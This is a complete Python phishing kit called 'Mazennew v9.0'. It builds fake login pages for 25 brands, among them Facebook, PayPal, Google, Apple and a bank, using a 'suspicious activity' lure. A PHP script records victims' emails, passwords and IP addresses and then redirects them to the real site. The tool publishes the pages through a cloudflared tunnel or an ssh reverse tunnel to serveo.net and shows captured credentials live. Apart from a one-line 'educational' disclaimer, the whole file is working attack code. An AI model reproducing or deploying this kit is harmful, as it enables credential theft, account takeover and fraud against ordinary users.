#!/usr/bin/env python3
# Mazennew v9.0 – Advanced Phishing Framework
# For educational and authorized testing only

import os, sys, time, subprocess, shutil, socket, threading, requests
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

VERSION = "9.0.0"
WORK_DIR = os.path.dirname(os.path.abspath(__file__))

PATHS = {
    "output": os.path.join(WORK_DIR, "output"),
    "logs": os.path.join(WORK_DIR, "logs"),
    "templates": os.path.join(WORK_DIR, "templates"),
}
for p in PATHS.values():
    os.makedirs(p, exist_ok=True)

CRED_FILE = os.path.join(PATHS["logs"], "credentials.txt")
PROCESSES = []
STOP_FLAG = False
TUNNEL_URL = None

APPS = {
    "1": {"name": "Facebook", "color": "#1877f2", "redirect": "https://www.facebook.com"},
    "2": {"name": "Instagram", "color": "#E4405F", "redirect": "https://www.instagram.com"},
    "3": {"name": "Twitter", "color": "#1DA1F2", "redirect": "https://twitter.com"},
    "4": {"name": "WhatsApp", "color": "#25D366", "redirect": "https://web.whatsapp.com"},
    "5": {"name": "Telegram", "color": "#26A5E4", "redirect": "https://web.telegram.org"},
    "6": {"name": "TikTok", "color": "#000000", "redirect": "https://www.tiktok.com"},
    "7": {"name": "Snapchat", "color": "#FFFC00", "redirect": "https://www.snapchat.com"},
    "8": {"name": "YouTube", "color": "#FF0000", "redirect": "https://www.youtube.com"},
    "9": {"name": "LinkedIn", "color": "#0A66C2", "redirect": "https://www.linkedin.com"},
    "10": {"name": "GitHub", "color": "#181717", "redirect": "https://github.com"},
    "11": {"name": "Netflix", "color": "#E50914", "redirect": "https://www.netflix.com"},
    "12": {"name": "PayPal", "color": "#003087", "redirect": "https://www.paypal.com"},
    "13": {"name": "Spotify", "color": "#1DB954", "redirect": "https://www.spotify.com"},
    "14": {"name": "Discord", "color": "#5865F2", "redirect": "https://discord.com"},
    "15": {"name": "Twitch", "color": "#9146FF", "redirect": "https://www.twitch.tv"},
    "16": {"name": "Reddit", "color": "#FF4500", "redirect": "https://www.reddit.com"},
    "17": {"name": "Pinterest", "color": "#BD081C", "redirect": "https://www.pinterest.com"},
    "18": {"name": "Kuraimi", "color": "#FFC107", "redirect": "https://www.kuraimibank.com"},
    "19": {"name": "Google", "color": "#4285F4", "redirect": "https://www.google.com"},
    "20": {"name": "Microsoft", "color": "#00A4EF", "redirect": "https://www.microsoft.com"},
    "21": {"name": "Apple", "color": "#000000", "redirect": "https://appleid.apple.com"},
    "22": {"name": "Amazon", "color": "#FF9900", "redirect": "https://www.amazon.com"},
    "23": {"name": "ProtonMail", "color": "#6D4AFF", "redirect": "https://proton.me"},
    "24": {"name": "Dropbox", "color": "#0061FF", "redirect": "https://www.dropbox.com"},
    "25": {"name": "Roblox", "color": "#000000", "redirect": "https://www.roblox.com"}
}

def log(msg):
    print(Fore.GREEN + f"[+] {msg}")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def create_phishing_page(app_id):
    app = APPS[app_id]
    html = f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>{app['name']} - Login</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:Arial}}
body{{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.card{{background:#fff;padding:40px;border-radius:12px;width:380px;text-align:center;box-shadow:0 2px 10px rgba(0,0,0,0.1)}}
.logo{{font-size:36px;font-weight:bold;color:{app['color']};margin-bottom:20px}}
input{{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px;font-size:16px}}
button{{background:{app['color']};color:#fff;width:100%;padding:14px;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}}
.alert{{background:#ffebe6;color:#d93025;padding:12px;border-radius:8px;margin-bottom:20px;font-size:13px}}
</style>
</head>
<body>
<div class="card">
    <div class="logo">{app['name']}</div>
    <div class="alert">⚠️ Suspicious activity detected</div>
    <form method="POST" action="login.php">
        <input type="text" name="email" placeholder="Email or Phone" autofocus>
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>
</div>
</body>
</html>'''
    with open(os.path.join(PATHS["templates"], "index.html"), "w") as f:
        f.write(html)

def create_login_php(redirect_url):
    php = f'''<?php
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');
$data = "[$date] IP: $ip | Email: $email | Password: $password\\n";
file_put_contents("../logs/credentials.txt", $data, FILE_APPEND);
header("Location: {redirect_url}");
exit();
?>'''
    with open(os.path.join(PATHS["templates"], "login.php"), "w") as f:
        f.write(php)

def start_php_server():
    os.chdir(PATHS["output"])
    proc = subprocess.Popen("php -S 0.0.0.0:8080 > /dev/null 2>&1", shell=True)
    PROCESSES.append(proc)
    log("PHP server started on port 8080")

def start_cloudflare_tunnel():
    global TUNNEL_URL
    subprocess.Popen("cloudflared tunnel --url http://localhost:8080 2>/dev/null &", shell=True)
    for i in range(10):
        time.sleep(1)
        try:
            r = requests.get("http://localhost:4040/api/tunnels", timeout=3)
            data = r.json()
            if data.get('tunnels'):
                TUNNEL_URL = data['tunnels'][0].get('public_url')
                if TUNNEL_URL:
                    return TUNNEL_URL
        except:
            pass
    return None

def monitor_credentials():
    last_size = 0
    while not STOP_FLAG:
        try:
            if os.path.exists(CRED_FILE):
                current_size = os.path.getsize(CRED_FILE)
                if current_size > last_size:
                    with open(CRED_FILE, "r") as f:
                        f.seek(last_size)
                        new_data = f.read()
                        if new_data:
                            print(Fore.RED + "\n" + "="*60)
                            print(Fore.RED + "🎯 NEW CREDENTIAL CAPTURED!")
                            print(Fore.RED + new_data.strip())
                            print(Fore.RED + "="*60)
                        last_size = current_size
            time.sleep(1)
        except:
            pass

def display_menu():
    print(Fore.CYAN + "\n" + "="*50)
    print(Fore.YELLOW + "        🎯 SELECT TARGET APP")
    print(Fore.CYAN + "="*50)
    items = list(APPS.items())
    for i in range(0, len(items), 3):
        line = "  "
        for j in range(3):
            if i + j < len(items):
                key, val = items[i + j]
                line += f"{key:2}. {val['name']:12}   "
        print(Fore.WHITE + line)
    print(Fore.CYAN + "="*50)

def start_attack():
    global STOP_FLAG
    STOP_FLAG = False
    
    display_menu()
    choice = input(Fore.YELLOW + "\n┌─[" + Fore.CYAN + "mazennew" + Fore.YELLOW + "]─[" + Fore.GREEN + "Select" + Fore.YELLOW + "]\n└────➤ " + Style.RESET_ALL).strip()
    
    if choice not in APPS:
        print(Fore.RED + "[-] Invalid choice!")
        return
    
    app = APPS[choice]
    log(f"Starting {app['name']} phishing attack")
    
    create_phishing_page(choice)
    create_login_php(app['redirect'])
    
    shutil.copy(os.path.join(PATHS["templates"], "index.html"), os.path.join(PATHS["output"], "index.html"))
    shutil.copy(os.path.join(PATHS["templates"], "login.php"), os.path.join(PATHS["output"], "login.php"))
    
    start_php_server()
    
    log("Starting Cloudflare tunnel for HTTPS URL...")
    public_url = start_cloudflare_tunnel()
    
    print(Fore.GREEN + "\n" + "="*60)
    print(Fore.GREEN + f"        🔥 {app['name']} READY! 🔥")
    print(Fore.GREEN + "="*60)
    
    if public_url:
        print(Fore.YELLOW + f"\n📡 Public URL: {Fore.CYAN}{public_url}")
        print(Fore.CYAN + "   ✅ HTTPS enabled")
    else:
        local_ip = get_local_ip()
        print(Fore.YELLOW + f"\n📡 Local URL: http://{local_ip}:8080")
        print(Fore.CYAN + "   Alternative: ssh -R 80:localhost:8080 serveo.net")
    
    print(Fore.YELLOW + "\n[*] Waiting for credentials... Press Ctrl+C to stop\n")
    monitor_credentials()

def view_logs():
    if os.path.exists(CRED_FILE):
        print(Fore.CYAN + "\n📋 CAPTURED CREDENTIALS")
        print("="*50)
        with open(CRED_FILE, "r") as f:
            print(Fore.YELLOW + f.read())
    else:
        print(Fore.YELLOW + "[-] No credentials yet")
    input("\nPress Enter...")

def clean():
    for f in os.listdir(PATHS["output"]):
        try: os.remove(os.path.join(PATHS["output"], f))
        except: pass
    if os.path.exists(CRED_FILE):
        os.remove(CRED_FILE)
    print(Fore.GREEN + "[+] Cleaned")

def stop_all():
    global STOP_FLAG
    STOP_FLAG = True
    for proc in PROCESSES:
        try: proc.terminate()
        except: pass
    os.system("pkill -f php")
    os.system("pkill -f cloudflared")
    print(Fore.GREEN + "[+] Stopped")

def banner():
    print(Fore.CYAN + """
╔═══════════════════════════════════════════════════════════════════╗
║         Mazennew v9.0 – Advanced Phishing Framework             ║
║         HTTPS + .COM URLs | 25+ Apps | Auto Tunnel              ║
╚═══════════════════════════════════════════════════════════════════╝
""")

def main():
    os.system("clear")
    banner()
    
    while True:
        print(Fore.YELLOW + """
┌─────────────────────────────────────────────────────────────┐
│  [1] 🚀 Start Phishing Attack                               │
│  [2] 📋 View Credentials                                    │
│  [3] 🧹 Clean All                                           │
│  [0] ❌ Exit                                                │
└─────────────────────────────────────────────────────────────┘
""")
        choice = input(Fore.YELLOW + "Select: " + Style.RESET_ALL).strip()
        
        if choice == '1':
            start_attack()
        elif choice == '2':
            view_logs()
        elif choice == '3':
            clean()
        elif choice == '0':
            stop_all()
            print(Fore.GREEN + "\nExiting...")
            sys.exit(0)
        else:
            print(Fore.RED + "Invalid")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stop_all()
        print(Fore.RED + "\nInterrupted")
        sys.exit(0)
